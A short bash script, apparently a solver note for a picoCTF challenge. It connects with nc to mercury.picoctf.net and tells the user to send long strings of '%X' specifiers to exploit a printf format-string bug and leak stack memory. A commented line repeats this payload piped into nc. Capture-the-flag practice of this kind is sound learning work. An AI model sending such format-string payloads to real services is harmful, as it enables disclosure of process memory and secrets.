#!/bin/bash

# printf vulnerability, so we can walk up the stack with %X!!!

echo "Type in 1";
echo "Then type in loooots of %X%X%X%X%X !!!";

nc mercury.picoctf.net 27912

# echo "%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X" | nc ... no idea how to echo with a sleep!?

